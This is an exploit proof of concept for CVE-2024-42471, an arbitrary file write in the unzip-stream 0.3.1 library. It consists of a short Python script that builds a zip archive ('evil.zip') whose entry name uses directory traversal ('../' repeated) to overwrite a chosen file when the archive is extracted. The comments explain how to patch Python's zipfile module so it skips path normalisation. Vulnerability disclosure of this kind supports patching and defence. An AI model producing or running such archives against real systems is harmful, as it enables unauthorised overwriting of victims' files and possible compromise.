# Exploit Title: unzip-stream 0.3.1 - Arbitrary File Write
# Date: 18th April, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Software link: https://github.com/mhr3/unzip-stream
# Version: unzip-stream 0.3.1
# Tested on: Ubuntu
# CVE: CVE-2024-42471



# NB: Python's built-in `zipfile` module has limitations on the `arcname` parameter.
# To bypass this restriction, edit the module's source code (`zipfile.py`) and comment out the following line:
# arcname = os.path.normpath(os.path.splitdrive(arcname)[1])
# For a more detailed explanation, feel free to check out my blog post here: https://themcsam.github.io/posts/unzip-stream-PoC/


import zipfile
import os
import sys

file_path = './poc' # Change to the file which contains the data to write
zip_name = 'evil.zip'
path_to_overwrite_file = 'home/mcsam/pocc' # Change to target file to write/overwrite

if not os.path.isfile(file_path):
    print(f"Error: File '{file_path}' does not exist.")
    sys.exit()

with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.write(file_path, \
    arcname=f'hack/../../../../../../../../../../../../../../{path_to_overwrite_file}')
    print(f"File '{file_path}' has been zipped as '{zip_name}'.")